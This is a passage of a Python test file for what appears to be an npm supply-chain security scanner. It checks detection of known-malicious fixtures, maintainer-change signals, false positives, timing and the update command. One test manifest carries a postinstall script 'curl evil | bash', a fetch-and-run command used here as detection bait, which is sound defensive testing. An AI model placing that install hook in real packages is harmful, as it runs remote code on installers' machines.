        fixture = Path(__file__).parent / "fixtures" / "event_stream"
        engine = create_default_engine()
        result = engine.scan(fixture)

        assert result.findings, "event_stream should have findings (it is known-malicious)"

    def test_fail_on_high_exits_1_for_high_findings(self):
        """--fail-on high should exit 1 when HIGH findings exist."""
        from picosentry.scan.engine import create_default_engine

        fixture = Path(__file__).parent / "fixtures" / "shai_hulud"
        engine = create_default_engine()
        result = engine.scan(fixture)

        severity_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
        has_high_plus = any(severity_order.get(f.severity.value.lower(), 4) <= 1 for f in result.findings)
        assert has_high_plus, "shai_hulud should have HIGH+ findings"


class TestCleanProject:
    """Clean project should produce minimal findings (no false positives)."""

    def test_clean_project_no_critical_or_high(self):
        """A well-maintained project should not trigger CRITICAL or HIGH findings."""
        fixture = Path(__file__).parent / "fixtures" / "clean_project"
        engine = create_default_engine()
        result = engine.scan(fixture)

        critical_or_high = [f for f in result.findings if f.severity in (Severity.CRITICAL, Severity.HIGH)]
        assert len(critical_or_high) == 0, "Clean project should have no CRITICAL/HIGH findings, got: " + ", ".join(
            f"{f.rule_id} {f.severity.value}" for f in critical_or_high
        )

    def test_clean_project_has_lockfile(self):
        """Clean project should not trigger L2-LOCK-001 for missing lockfile."""
        fixture = Path(__file__).parent / "fixtures" / "clean_project"
        engine = create_default_engine()
        result = engine.scan(fixture)

        lock_findings = [f for f in result.findings if f.rule_id == "L2-LOCK-001"]
        # May still flag other lockfile issues, but not "missing lockfile"
        missing_lock = [f for f in lock_findings if "missing" in f.evidence.lower()]
        assert len(missing_lock) == 0, "Clean project has a lockfile, should not flag as missing"

    def test_clean_project_has_repository(self):
        """Clean project should not trigger L2-PROV-001 for missing repository."""
        fixture = Path(__file__).parent / "fixtures" / "clean_project"
        engine = create_default_engine()
        result = engine.scan(fixture)

        prov_findings = [f for f in result.findings if f.rule_id == "L2-PROV-001"]
        missing_repo = [f for f in prov_findings if "no repository" in f.evidence.lower()]
        assert len(missing_repo) == 0, "Clean project has a repository field"


class TestMaintainerChange:
    """Test L2-MAINT-001: maintainer change detection signals."""

    def test_npm_user_differs_from_author(self, tmp_path):
        """Publisher (_npmUser) differs from declared author — maintainer change signal."""
        project = _make_project(
            tmp_path,
            {
                "name": "handed-off-lib",
                "version": "4.0.0",
                "author": "OriginalDev <original@example.com>",
                "_npmUser": {"name": "newmaintainer2024", "email": "new@suspicious.xyz"},
                "scripts": {"postinstall": "node ./setup.js"},
            },
        )
        from picosentry.scan.rules.maintainer_change import detect_maintainer_changes

        findings = detect_maintainer_changes(project)
        maintainer_findings = [f for f in findings if f.rule_id == "L2-MAINT-001"]
        npm_user_findings = [
            f for f in maintainer_findings if "published by" in f.message and "declares author" in f.message
        ]
        assert len(npm_user_findings) >= 1, (
            f"Expected _npmUser vs author mismatch finding, got: {[f.message for f in maintainer_findings]}"
        )

    def test_no_author_with_install_scripts(self, tmp_path):
        """No author + install scripts — critical signal (event-stream pattern)."""
        project = _make_project(
            tmp_path,
            {
                "name": "anonymous-rce",
                "version": "1.0.0",
                "scripts": {"postinstall": "curl evil | bash"},
            },
        )
        from picosentry.scan.rules.maintainer_change import detect_maintainer_changes

        findings = detect_maintainer_changes(project)
        no_author_scripts = [
            f
            for f in findings
            if f.rule_id == "L2-MAINT-001"
            and "no author" in f.message.lower()
            and "install scripts" in f.message.lower()
        ]
        assert len(no_author_scripts) >= 1, (
            f"Expected no-author + scripts finding, got: {[f.message for f in findings]}"
        )
        assert no_author_scripts[0].severity == Severity.HIGH

    def test_single_maintainer_with_scripts(self, tmp_path):
        """Single maintainer + install scripts — bus factor signal."""
        project = _make_project(
            tmp_path,
            {
                "name": "single-dev-pkg",
                "version": "2.3.4",
                "author": {"name": "LonelyDev", "email": "lonely@example.com"},
                "scripts": {"postinstall": "node ./check.js"},
                "repository": {"type": "git", "url": "https://github.com/lonelydev/pkg"},
            },
        )
        from picosentry.scan.rules.maintainer_change import detect_maintainer_changes

        findings = detect_maintainer_changes(project)
        bus_factor = [f for f in findings if f.rule_id == "L2-MAINT-001" and "single maintainer" in f.message.lower()]
        assert len(bus_factor) >= 1, (
            f"Expected single maintainer + scripts finding, got: {[f.message for f in findings]}"
        )

    def test_maintainer_domains_differ(self, tmp_path):
        """Maintainers from different email domains — org transfer signal."""
        project = _make_project(
            tmp_path,
            {
                "name": "transferred-pkg",
                "version": "3.0.0",
                "author": "OriginalAuthor <orig@example.com>",
                "maintainers": [
                    {"name": "orig", "email": "orig@example.com"},
                    {"name": "newperson", "email": "new@suspicious.xyz"},
                ],
            },
        )
        from picosentry.scan.rules.maintainer_change import detect_maintainer_changes

        findings = detect_maintainer_changes(project)
        domain_findings = [
            f for f in findings if f.rule_id == "L2-MAINT-001" and "different domains" in f.message.lower()
        ]
        assert len(domain_findings) >= 1, (
            f"Expected multi-domain maintainers finding, got: {[f.message for f in findings]}"
        )

    def test_no_author_no_scripts(self, tmp_path):
        """No author and no scripts — medium severity signal."""
        project = _make_project(
            tmp_path,
            {
                "name": "mystery-pkg",
                "version": "0.1.0",
            },
        )
        from picosentry.scan.rules.maintainer_change import detect_maintainer_changes

        findings = detect_maintainer_changes(project)
        no_author = [
            f
            for f in findings
            if f.rule_id == "L2-MAINT-001"
            and "no author" in f.message.lower()
            and "install scripts" not in f.message.lower()
        ]
        assert len(no_author) >= 1, f"Expected no-author finding, got: {[f.message for f in findings]}"
        assert no_author[0].severity == Severity.MEDIUM

    def test_short_author_name(self, tmp_path):
        """Very short author name — pseudonymous risk."""
        project = _make_project(
            tmp_path,
            {
                "name": "anon-pkg",
                "version": "1.0.0",
                "author": "jk",
            },
        )
        from picosentry.scan.rules.maintainer_change import detect_maintainer_changes

        findings = detect_maintainer_changes(project)
        short_name = [f for f in findings if f.rule_id == "L2-MAINT-001" and "short author" in f.message.lower()]
        assert len(short_name) >= 1, f"Expected short author name finding, got: {[f.message for f in findings]}"

    def test_legitimate_author_not_flagged(self, tmp_path):
        """Legitimate single author with no scripts should not trigger HIGH."""
        project = _make_project(
            tmp_path,
            {
                "name": "good-pkg",
                "version": "1.0.0",
                "author": {"name": "GoodDeveloper", "email": "dev@example.com"},
                "repository": {"type": "git", "url": "https://github.com/gooddeveloper/good-pkg"},
            },
        )
        from picosentry.scan.rules.maintainer_change import detect_maintainer_changes

        findings = detect_maintainer_changes(project)
        high_findings = [f for f in findings if f.rule_id == "L2-MAINT-001" and f.severity == Severity.HIGH]
        assert len(high_findings) == 0, (
            f"Legitimate author should not trigger HIGH, got: {[f.message for f in high_findings]}"
        )

    def test_maintainer_change_fixture(self):
        """Full scan on maintainer_change fixture detects _npmUser mismatch."""
        fixture = Path(__file__).parent / "fixtures" / "maintainer_change"
        engine = create_default_engine()
        result = engine.scan(fixture)
        maintainer_findings = [f for f in result.findings if f.rule_id == "L2-MAINT-001"]
        # Should detect _npmUser vs author mismatch and other signals
        assert len(maintainer_findings) >= 1, (
            f"Expected maintainer change findings, got: {[f.message for f in result.findings]}"
        )

    def test_no_author_scripts_fixture(self):
        """Full scan on maintainer_no_author_scripts fixture detects HIGH signal."""
        fixture = Path(__file__).parent / "fixtures" / "maintainer_no_author_scripts"
        engine = create_default_engine()
        result = engine.scan(fixture)
        high_maint = [f for f in result.findings if f.rule_id == "L2-MAINT-001" and f.severity == Severity.HIGH]
        assert len(high_maint) >= 1, (
            f"Expected HIGH maintainer finding for no-author + scripts, got: {[f.message for f in result.findings]}"
        )

    def test_single_maintainer_fixture(self):
        """Full scan on single maintainer with scripts fixture."""
        fixture = Path(__file__).parent / "fixtures" / "maintainer_single_with_scripts"
        engine = create_default_engine()
        result = engine.scan(fixture)
        bus_factor = [
            f for f in result.findings if f.rule_id == "L2-MAINT-001" and "single maintainer" in f.message.lower()
        ]
        assert len(bus_factor) >= 1, (
            f"Expected single maintainer + scripts finding, got: {[f.message for f in result.findings]}"
        )


# ── v0.8.0: Verbose mode, timeout, per-rule timing, engine_version ──


class TestVerboseAndTiming:
    """Tests for --verbose flag, per-rule timing, and engine_version tracking."""

    def test_engine_version_in_scan_result(self, tmp_path):
        """ScanResult should include the current engine version."""
        project = _make_project(tmp_path, {"name": "test-ver", "version": "1.0.0"})
        engine = create_default_engine()
        result = engine.scan(project)
        # Engine version should match package version
        from picosentry.scan import __version__

        assert result.engine_version == __version__

    def test_rule_timings_in_stats(self, tmp_path):
        """ScanStats should include per-rule timing data."""
        project = _make_project(tmp_path, {"name": "test-timing", "version": "1.0.0"})
        engine = create_default_engine()
        result = engine.scan(project)
        assert isinstance(result.stats.rule_timings_ms, dict)
        # Every executed rule should have a timing entry.
        # Ecosystem-specific rules (PyPI) may be filtered out at scan time
        # if the target doesn't have ecosystem indicators.
        for rule_id in result.stats.rule_timings_ms:
            assert rule_id in engine.list_rules(), f"Unexpected timing for {rule_id}"
        for rule_id in engine.list_rules():
            # Per-ecosystem prefix rules have been consolidated into shared engines
            if rule_id.startswith("L2-PYPI-"):
                continue
            assert rule_id in result.stats.rule_timings_ms, f"Missing timing for {rule_id}"
            assert isinstance(result.stats.rule_timings_ms[rule_id], int)
            assert result.stats.rule_timings_ms[rule_id] >= 0

    def test_rule_timings_in_json_output(self, tmp_path):
        """Per-rule timings should appear in JSON output."""
        project = _make_project(tmp_path, {"name": "test-timing-json", "version": "1.0.0"})
        engine = create_default_engine()
        result = engine.scan(project)
        data = json.loads(result.to_json())
        assert "rule_timings_ms" in data["stats"]
        assert isinstance(data["stats"]["rule_timings_ms"], dict)

    def test_rule_timings_excluded_from_deterministic_comparison(self, tmp_path):
        """Per-rule timings should be excluded from diff comparison (non-deterministic)."""
        project = _make_project(tmp_path, {"name": "test-det", "version": "1.0.0"})
        engine = create_default_engine()
        result_a = engine.scan(project)
        result_b = engine.scan(project)

        dict_a = result_a.to_dict()
        dict_b = result_b.to_dict()

        # Remove non-deterministic fields
        dict_a["stats"].pop("duration_ms", None)
        dict_b["stats"].pop("duration_ms", None)
        dict_a["stats"].pop("rule_timings_ms", None)
        dict_b["stats"].pop("rule_timings_ms", None)
        # rule_status contains per-rule duration_ms which varies between runs
        dict_a.pop("rule_status", None)
        dict_b.pop("rule_status", None)
        dict_a.pop("scan_completeness", None)
        dict_b.pop("scan_completeness", None)
        # audit timestamps vary between runs
        dict_a.pop("audit", None)
        dict_b.pop("audit", None)

        assert dict_a == dict_b

    def test_verbose_flag_in_scan(self, tmp_path):
        """--verbose flag should produce stderr output with scan details."""
        project = _make_project(tmp_path, {"name": "test-verbose", "version": "1.0.0"})
        proc = subprocess.run(
            [sys.executable, "-m", "picosentry", "scan", str(project), "--format", "json", "--verbose"],
            capture_output=True,
            text=True,
            timeout=30,
        )
        assert proc.returncode == 0
        assert "PicoSentry v" in proc.stderr
        assert "Rule Timings:" in proc.stderr

    def test_timeout_flag_accepted(self, tmp_path):
        """--timeout flag should be accepted without error."""
        project = _make_project(tmp_path, {"name": "test-timeout", "version": "1.0.0"})
        proc = subprocess.run(
            [sys.executable, "-m", "picosentry", "scan", str(project), "--format", "json", "--timeout", "30"],
            capture_output=True,
            text=True,
            timeout=60,
        )
        assert proc.returncode == 0


class TestCorpusResolution:
    """Test corpus directory resolution: explicit > user > built-in."""

    def test_user_corpus_dir_default(self):
        """user_corpus_dir returns a Path under ~/.local/share/picosentry/corpus."""
        from picosentry.scan.engine import user_corpus_dir

        corpus_dir = user_corpus_dir()
        assert str(corpus_dir).endswith("picosentry/corpus")

    def test_user_corpus_dir_env_override(self, monkeypatch):
        """PICOCORPUS_DIR env var overrides the default path."""
        from picosentry.scan.engine import user_corpus_dir

        monkeypatch.setenv("PICOCORPUS_DIR", "/custom/corpus")
        assert user_corpus_dir() == Path("/custom/corpus")

    def test_user_corpus_dir_xdg(self, monkeypatch):
        """XDG_DATA_HOME is respected."""
        from picosentry.scan.engine import user_corpus_dir

        monkeypatch.setenv("XDG_DATA_HOME", "/xdg/data")
        monkeypatch.delenv("PICOCORPUS_DIR", raising=False)
        assert user_corpus_dir() == Path("/xdg/data/picosentry/corpus")

    def test_engine_uses_explicit_corpus_dir(self, tmp_path):
        """Explicit corpus_dir takes priority over everything."""
        from picosentry.scan.engine import ScanEngine

        engine = ScanEngine(corpus_dir=tmp_path)
        assert engine._corpus_dir == tmp_path

    def test_engine_falls_back_to_builtin(self):
        """Without user corpus, engine falls back to built-in."""
        from picosentry.scan.engine import ScanEngine

        engine = ScanEngine()
        # Should use the built-in corpus shipped with the package
        assert "corpus" in str(engine._corpus_dir)

    def test_engine_uses_user_corpus_when_present(self, tmp_path, monkeypatch):
        """Engine uses user corpus dir when npm_top_packages.json exists there."""
        from picosentry.scan.engine import ScanEngine

        # Create a user corpus file
        user_dir = tmp_path / "picosentry" / "corpus"
        user_dir.mkdir(parents=True)
        (user_dir / "npm_top_packages.json").write_text('["fakepkg"]', encoding="utf-8")
        # Point PICOCORPUS_DIR to our temp dir
        monkeypatch.setenv("PICOCORPUS_DIR", str(user_dir))
        engine = ScanEngine()
        assert engine._corpus_dir == user_dir

    def test_user_corpus_dir_exported_from_init(self):
        """user_corpus_dir is accessible from picosentry package."""
        from picosentry.scan import user_corpus_dir

        assert callable(user_corpus_dir)

    def test_update_uses_user_corpus_dir(self, tmp_path, monkeypatch):
        """picosentry update defaults to user corpus dir, not package dir."""
        monkeypatch.setenv("PICOCORPUS_DIR", str(tmp_path / "corpus"))
        # Just verify the CLI parses correctly — we don't want to actually hit npm
        proc = subprocess.run(
            [sys.executable, "-m", "picosentry", "update", "--help"],
            capture_output=True,
            text=True,
            timeout=10,
        )
        assert proc.returncode == 0


class TestUpdateCommand:
    """Test the 'update' command's network safety features."""

    def _mock_urlopen(self, response_data: bytes):
        """Create a mock for safe_urlopen that returns (response, body)."""
        from unittest.mock import MagicMock

        mock_resp = MagicMock()
        return MagicMock(return_value=(mock_resp, response_data))

    def test_update_response_size_limit(self, tmp_path):
        """update command rejects responses larger than 10MB."""
        import argparse
        from unittest.mock import patch

        from picosentry.scan.cli import _cmd_update

        # Mock urlopen to return an oversized response
        big_data = b"x" * (11 * 1024 * 1024)  # 11MB
        mock_urlopen = self._mock_urlopen(big_data)

        output = str(tmp_path / "npm_top_packages.json")
        args = argparse.Namespace(top=10, output=output)

        with patch("picosentry.scan.cli_commands.update.safe_urlopen", mock_urlopen):
            result = _cmd_update(args)
        assert result == 1  # Should fail due to size limit

    def test_update_rejects_invalid_json_response(self, tmp_path):
        """update command rejects non-JSON responses."""
        import argparse
        from unittest.mock import patch

        from picosentry.scan.cli import _cmd_update

        mock_urlopen = self._mock_urlopen(b"<html>Not JSON</html>")

        output = str(tmp_path / "npm_top_packages.json")
        args = argparse.Namespace(top=10, output=output)

        with patch("picosentry.scan.cli_commands.update.safe_urlopen", mock_urlopen):
            result = _cmd_update(args)
        assert result != 0  # Should fail

    def test_update_writes_to_user_corpus_dir(self, tmp_path):
        """update command writes to user corpus dir by default."""
        import argparse
        from unittest.mock import patch

        from picosentry.scan.cli import _cmd_update

        # Mock a valid npm-rank response
        valid_response = json.dumps([{"name": "express"}]).encode("utf-8")

        mock_urlopen = self._mock_urlopen(valid_response)

        output = str(tmp_path / "npm_top_packages.json")
        args = argparse.Namespace(top=10, output=output)

        with patch("picosentry.scan.cli_commands.update.safe_urlopen", mock_urlopen):
            result = _cmd_update(args)
        assert result == 0
        assert Path(output).is_file()

    def test_update_validates_response_format(self, tmp_path):
        """update command validates that npm-rank response is a list."""
        import argparse
        from unittest.mock import patch

        from picosentry.scan.cli import _cmd_update

        # Response is valid JSON but wrong format (npm-rank expects a list)
        bad_format = json.dumps({"error": "not found"}).encode("utf-8")
        mock_urlopen = self._mock_urlopen(bad_format)

        output = str(tmp_path / "npm_top_packages.json")
        args = argparse.Namespace(top=10, output=output)

        with patch("picosentry.scan.cli_commands.update.safe_urlopen", mock_urlopen):
            result = _cmd_update(args)
        # Should fail — response doesn't have expected format
        assert result == 1
